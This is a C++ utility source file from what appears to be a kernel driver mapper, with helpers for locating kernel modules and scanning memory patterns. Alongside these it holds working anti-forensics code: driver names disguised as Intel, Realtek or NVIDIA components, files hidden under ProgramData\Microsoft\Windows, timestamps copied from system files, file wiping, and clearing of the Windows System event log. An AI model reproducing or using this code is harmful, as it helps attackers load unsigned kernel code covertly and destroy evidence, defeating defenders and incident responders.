#include "utils.hpp"
#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <random>

#include "nt.hpp"

std::wstring kdmUtils::GetFullTempPath() {
	wchar_t temp_directory[MAX_PATH + 1] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
		kdmLog(L"[-] Failed to get temp path" << std::endl);
		return L"";
	}
	if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
		temp_directory[wcslen(temp_directory) - 1] = 0x0;

	return std::wstring(temp_directory);
}

std::wstring kdmUtils::GetStealthPath() {
	wchar_t path[MAX_PATH] = { 0 };
	if (GetEnvironmentVariableW(L"ProgramData", path, MAX_PATH) > 0) {
		std::wstring dir = std::wstring(path) + L"\\Microsoft\\Windows";
		DWORD attr = GetFileAttributesW(dir.c_str());
		if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
			return dir;
	}
	return GetFullTempPath();
}

std::wstring kdmUtils::GenerateStealthDriverName() {
	static const wchar_t* prefixes[] = {
		L"IntelPch", L"RtkHdBus", L"NvAudioProv", L"PciAuxHost", L"AcpiBusExt", L"AmdPchProv", L"SysCtrlAux"
	};
	static std::mt19937_64 rng(GetTickCount64() ^ (uint64_t)GetCurrentProcessId());
	std::uniform_int_distribution<size_t> distPrefix(0, (sizeof(prefixes) / sizeof(prefixes[0])) - 1);
	std::uniform_int_distribution<uint32_t> distHex(0x1000, 0xFFFF);

	wchar_t suffix[16] = { 0 };
	swprintf_s(suffix, L"_%04X", distHex(rng));
	return std::wstring(prefixes[distPrefix(rng)]) + suffix;
}

bool kdmUtils::ReadFileToMemory(const std::wstring& file_path, std::vector<BYTE>* out_buffer) {
	std::ifstream file_ifstream(file_path, std::ios::binary);

	if (!file_ifstream)
		return false;

	out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
	file_ifstream.close();

	return true;
}

bool kdmUtils::CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size) {
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size)) {
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

bool kdmUtils::SetFileTimestamps(const std::wstring& targetPath) {
	HANDLE hRef = CreateFileW(L"C:\\Windows\\System32\\drivers\\null.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hRef == INVALID_HANDLE_VALUE) {
		hRef = CreateFileW(L"C:\\Windows\\System32\\ntoskrnl.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	}

	FILETIME ftCreate = { 0 }, ftAccess = { 0 }, ftWrite = { 0 };
	bool retrieved = false;
	if (hRef != INVALID_HANDLE_VALUE) {
		if (GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite)) {
			retrieved = true;
		}
		CloseHandle(hRef);
	}

	if (!retrieved) return false;

	HANDLE hTarget = CreateFileW(targetPath.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTarget != INVALID_HANDLE_VALUE) {
		SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
		CloseHandle(hTarget);
		return true;
	}
	return false;
}

bool kdmUtils::WipeFile(const std::wstring& path) {
	HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return _wremove(path.c_str()) == 0;
	}

	LARGE_INTEGER fileSize;
	if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart <= 0) {
		CloseHandle(hFile);
		return _wremove(path.c_str()) == 0;
	}

	const size_t bufSize = 65536;
	std::vector<BYTE> noise(bufSize);
	static std::mt19937 rng(GetTickCount());
	std::uniform_int_distribution<int> dist(0, 255);

	for (size_t i = 0; i < bufSize; ++i) {
		noise[i] = static_cast<BYTE>(dist(rng));
	}

	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	LONGLONG remaining = fileSize.QuadPart;
	while (remaining > 0) {
		DWORD toWrite = (DWORD)min((LONGLONG)bufSize, remaining);
		DWORD written = 0;
		if (!WriteFile(hFile, noise.data(), toWrite, &written, NULL) || written == 0)
			break;
		remaining -= written;
	}

	FlushFileBuffers(hFile);
	CloseHandle(hFile);
	return _wremove(path.c_str()) == 0;
}

bool kdmUtils::ClearSecurityEventLogs() {
	HANDLE hLog = OpenEventLogW(NULL, L"System");
	if (hLog) {
		ClearEventLogW(hLog, NULL);
		CloseEventLog(hLog);
		return true;
	}
	return false;
}

uint64_t kdmUtils::GetKernelModuleAddress(const std::string& module_name) {
	void* buffer = nullptr;
	DWORD buffer_size = 0;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return 0;
	}

	const auto modules = static_cast<nt::PRTL_PROCESS_MODULES>(buffer);
	if (!modules)
		return 0;

	for (auto i = 0u; i < modules->NumberOfModules; ++i) {
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);

		if (!_stricmp(current_module_name.c_str(), module_name.c_str()))
		{
			const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}

BOOLEAN kdmUtils::bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return 0;
	return (*szMask) == 0;
}

uintptr_t kdmUtils::FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	size_t max_len = dwLen - strlen(szMask);
	for (uintptr_t i = 0; i < max_len; i++)
		if (bDataCompare((BYTE*)(dwAddress + i), bMask, szMask))
			return (uintptr_t)(dwAddress + i);
	return 0;
}

PVOID kdmUtils::FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	size_t namelength = strlen(sectionName);
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, sectionName, namelength) == 0 &&
			namelength == strlen((char*)section->Name)) {
			if (!section->VirtualAddress) {
				return 0;
			}
			if (size) {
				*size = section->Misc.VirtualSize;
			}
			return (PVOID)(modulePtr + section->VirtualAddress);
		}
	}
	return 0;
}

std::wstring kdmUtils::GetCurrentAppFolder() {
	wchar_t buffer[1024];
	GetModuleFileNameW(NULL, buffer, 1024);
	std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
	return std::wstring(buffer).substr(0, pos);
}